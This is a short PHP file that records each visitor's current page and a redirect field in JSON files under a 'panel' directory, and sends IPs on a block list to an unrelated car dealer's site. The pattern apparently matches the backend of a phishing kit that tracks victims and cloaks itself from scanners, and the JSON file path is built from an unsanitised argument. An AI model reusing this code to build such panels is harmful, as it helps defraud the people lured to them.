<?php 

function get_page_info($get_name_page, $get_name_file) {
    if (isset($_SESSION['id_user'])){
        $name_file = $get_name_file;
        $current_page = $get_name_page;
        $timestamp =  date("Y-m-d H:i:s");
        $file_path = "../panel/storage/{$name_file}.json";
        $json_data = file_get_contents($file_path);
        $user_data = json_decode($json_data, true);
        $user_data['current_page'] = $current_page;
        $user_data['timestamp'] = $timestamp;
        $user_data['redirect_user'] = " ";
        $updated_json_data = json_encode($user_data);
        file_put_contents($file_path, $updated_json_data);
        
    } else {
        header('Location: ../index.php');
    }
}

function isBlocked($ip) {
    $blockedIPs = file_get_contents('../panel/actions/blocked_ips.txt');
    return strpos($blockedIPs, $ip) !== false;
}

$userIP = get_client_ip();

if (isBlocked($userIP)) {
    header("Location: https://www.superhonda.com/");
    exit();
}

?>